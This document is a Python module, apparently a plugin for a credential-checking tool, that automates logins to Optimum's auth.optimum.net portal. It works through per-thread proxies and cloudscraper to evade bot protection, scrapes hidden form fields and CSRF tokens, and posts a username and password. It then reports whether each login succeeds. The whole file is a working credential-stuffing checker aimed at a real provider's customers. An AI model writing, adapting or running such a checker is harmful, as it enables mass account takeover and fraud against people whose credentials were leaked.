"""
Checker for Optimum (auth.optimum.net) – Auth0 login with full token extraction.
"""
import re
import threading
from typing import Tuple
from urllib.parse import urljoin, urlparse, parse_qs

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://auth.optimum.net"
LOGIN_URL = "https://auth.optimum.net/u/login?state=hKFo2SB6SWc0M3pNX3JhV185OTZNYVJocjllVUpGNmFGMkJiaKFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIEFOVWdZQnJOd3Q0MGZLb0ZRSUp2Ui1xRXJxN3FxYnlDo2NpZNkgdTVsQk8xQnQ2REVxeHBjcmllVlJjczB4a2xGbWJrWHc"
TIMEOUT = 20

def check(username: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_URL,
    })

    try:
        # Step 1: GET login page – extract all hidden fields
        resp = session.get(LOGIN_URL, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text

        # Find the form action – it may be a relative path
        form_match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
        if form_match:
            form_action = urljoin(BASE_URL, form_match.group(1))
        else:
            # If no form, try to find the login endpoint from a script (Auth0)
            # Look for "connection" or "login" endpoint in JavaScript
            action_match = re.search(r'url:\s*["\']([^"\']+login[^"\']*)["\']', html, re.I)
            if action_match:
                form_action = urljoin(BASE_URL, action_match.group(1))
            else:
                form_action = LOGIN_URL

        # Extract all hidden inputs (including state, client_id, csrf, etc.)
        payload = {"username": username, "password": password}
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]+)"'
        for name, value in re.findall(hidden_pattern, html, re.I):
            if name.lower() not in ["username", "password"]:
                payload[name] = value

        # Also check for CSRF token in meta tags
        csrf_meta = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
        if csrf_meta:
            payload["csrf_token"] = csrf_meta.group(1)

        # If no hidden fields, Auth0 might use a JSON payload – try to extract from script
        if not any(k for k in payload if k not in ["username", "password"]):
            # Look for a JSON object with login parameters
            script_match = re.search(r'var\s+config\s*=\s*({[^;]+});', html, re.I)
            if script_match:
                try:
                    import json
                    config = json.loads(script_match.group(1))
                    if "state" in config:
                        payload["state"] = config["state"]
                    if "client_id" in config:
                        payload["client_id"] = config["client_id"]
                    if "connection" in config:
                        payload["connection"] = config["connection"]
                except:
                    pass

        # Step 2: POST credentials
        post_resp = session.post(form_action, data=payload, allow_redirects=False, timeout=TIMEOUT)

        # Step 3: Determine success
        if post_resp.status_code in (301, 302):
            location = post_resp.headers.get("Location", "").lower()
            if any(x in location for x in ["callback", "dashboard", "home", "account", "index"]):
                return True, "Login successful (redirect to dashboard)"
            else:
                # If redirect is back to login, it's a failure
                if "login" in location:
                    return False, "Login failed (redirected back to login)"
                return False, f"Login failed (unexpected redirect to {location})"

        # If status 200, inspect HTML
        html = post_resp.text.lower()
        if "invalid" in html or "incorrect" in html or "error" in html:
            # Try to extract the exact error message
            error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', post_resp.text, re.I | re.S)
            if error_match:
                return False, f"Login failed: {error_match.group(1).strip()}"
            return False, "Invalid credentials"

        if "logout" in html or "dashboard" in html or "welcome" in html:
            return True, "Login successful"

        if "username" in html and "password" in html and "login" in html:
            return False, "Login failed – still on login page"

        return False, "Login failed – unknown response"

    except Exception as e:
        return False, f"Request error: {str(e)}"